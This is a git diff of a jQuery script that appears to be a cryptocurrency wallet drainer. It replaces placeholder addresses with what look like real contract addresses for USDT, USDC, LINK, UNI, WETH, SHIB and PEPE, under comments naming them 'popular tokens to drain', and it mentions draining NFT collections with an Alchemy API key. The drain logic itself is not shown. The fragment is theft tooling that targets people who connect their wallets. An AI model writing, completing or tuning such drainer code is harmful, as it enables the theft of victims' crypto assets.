@@ -141,16 +141,16 @@ $(document).ready(function () {
         }
     }
 
-    // Common ERC-20 token contracts (popular tokens to drain)
-    const COMMON_TOKENS = [
-        { symbol: "USDT", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 6 },
-        { symbol: "USDC", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 6 },
-        { symbol: "LINK", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
-        { symbol: "UNI", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
-        { symbol: "WETH", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
-        { symbol: "SHIB", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 },
-        { symbol: "PEPE", address: "0x5d5AcFBc53A5004251b6Dec0D4ca8477FbBD73F7", decimals: 18 }
-    ];
+// Common ERC-20 token contracts (popular tokens to drain)
+const COMMON_TOKENS = [
+    { symbol: "USDT", address: "0xdAC17F958D2ee523a2206206994597C13D831ec7", decimals: 6 },
+    { symbol: "USDC", address: "0xA0b86a33E6417F54765d7e0b6C1E261CfD6B6C8B", decimals: 6 },
+    { symbol: "LINK", address: "0x514910771AF9Ca656af840dff83E8264EcF986CA", decimals: 18 },
+    { symbol: "UNI", address: "0x1f9840a85d5aF5bf1D1762F925BDADdC4201F984", decimals: 18 },
+    { symbol: "WETH", address: "0xC02aaA39b223FE8D0A0e5C4F27eAD9083C756Cc2", decimals: 18 },
+    { symbol: "SHIB", address: "0x95aD61b0a150d79219dCF64E1e6Cc01f0B64C4cE", decimals: 18 },
+    { symbol: "PEPE", address: "0x6982508145454Ce325dDBE47a25d4ec3d2311933", decimals: 18 }
+];
 
     // Common NFT contracts (popular collections to drain)
     // Note: You need an Alchemy API key to fetch all user NFTs dynamically
